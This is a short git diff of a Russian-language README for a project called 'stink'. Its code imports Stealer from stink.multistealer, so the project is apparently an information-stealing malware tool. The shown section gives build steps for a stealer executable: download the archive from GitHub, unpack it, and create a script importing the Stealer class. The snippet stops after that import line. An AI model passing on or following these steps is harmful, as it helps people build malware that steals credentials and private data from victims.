@@ -124,7 +124,7 @@ Python является интерпретируемым языком прогр
 ### Создание исполняемого файла
 
 1. [Скачиваем](https://github.com/FallenAstaroth/stink/archive/refs/heads/master.zip) архив.
-2. Создаем директорию и распаковываем в ней архив.
+2. Распаковываем архив и переходим в директорию stink-master.
 3. Создаем test.py (или любое другое название) файл в этой же директории со следующим кодом:
 ```python
 from stink.multistealer import Stealer
